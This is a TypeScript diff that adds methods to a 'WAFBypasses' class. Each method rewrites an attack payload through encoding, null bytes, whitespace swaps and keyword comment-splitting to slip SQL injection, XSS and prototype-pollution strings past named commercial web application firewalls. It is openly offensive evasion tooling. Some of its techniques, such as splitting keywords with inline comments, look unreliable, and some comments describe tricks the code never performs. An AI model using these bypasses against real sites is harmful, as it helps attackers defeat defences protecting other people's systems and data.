@@ -513,6 +513,82 @@ export class WAFBypasses {
 	}
 
 	/**
+	 * Signal Sciences specific bypasses
+	 */
+	static signalSciencesBypass(payload: string): string[] {
+		const bypasses = [payload];
+		// Signal Sciences often looks at normalized requests. 
+		// Adding junk parameters or changing HTTP methods often helps.
+		bypasses.push(payload.replace(/=/g, '%3D'));
+		bypasses.push(PayloadEncoder.hexEncode(payload));
+		if (/__proto__/i.test(payload)) {
+			bypasses.push(payload.replace(/__proto__/gi, '__pr\\u006f\\u0074o__'));
+		}
+		return [...new Set(bypasses)];
+	}
+
+	/**
+	 * NGINX App Protect / NAXSI bypasses
+	 */
+	static nginxAppProtectBypass(payload: string): string[] {
+		const bypasses = [payload];
+		// NAXSI relies heavily on scoring based on specific characters
+		bypasses.push(payload.replace(/</g, '%3C').replace(/>/g, '%3E'));
+		bypasses.push(payload.replace(/'/g, '&#x27;'));
+		// Whitespace obfuscation
+		bypasses.push(payload.replace(/\s/g, '%09'));
+		return [...new Set(bypasses)];
+	}
+
+	/**
+	 * HAProxy specific bypasses
+	 */
+	static haproxyBypass(payload: string): string[] {
+		const bypasses = [payload];
+		// HAProxy often blocks based on strict ACLs.
+		// HTTP request smuggling or header manipulation is common.
+		bypasses.push(PayloadEncoder.doubleUrlEncode(payload));
+		// Case variations
+		bypasses.push(this.randomCase(payload));
+		return [...new Set(bypasses)];
+	}
+
+	/**
+	 * IBM DataPower bypasses
+	 */
+	static ibmDataPowerBypass(payload: string): string[] {
+		const bypasses = [payload];
+		// XML/JSON wrapping and encoding can sometimes bypass DataPower
+		bypasses.push(PayloadEncoder.unicodeEncode(payload));
+		bypasses.push(payload.replace(/</g, '\\u003c'));
+		return [...new Set(bypasses)];
+	}
+
+	/**
+	 * Reblaze bypasses
+	 */
+	static reblazeBypass(payload: string): string[] {
+		const bypasses = [payload];
+		// Reblaze blocks many basic injections.
+		// Mixing encoding types can help bypass its regex engines.
+		bypasses.push(PayloadEncoder.mixedCaseEncode(payload));
+		bypasses.push(payload + '%00'); // Null byte
+		return [...new Set(bypasses)];
+	}
+
+	/**
+	 * DotDefender bypasses
+	 */
+	static dotDefenderBypass(payload: string): string[] {
+		const bypasses = [payload];
+		// DotDefender is signature-based.
+		bypasses.push(payload.replace(/union/gi, 'uni/**/on'));
+		bypasses.push(payload.replace(/select/gi, 'sel/**/ect'));
+		bypasses.push(payload.replace(/script/gi, 'scr/**/ipt'));
+		return [...new Set(bypasses)];
+	}
+
+	/**
 	 * Generate random case variations
 	 */
 	private static randomCase(str: string): string {
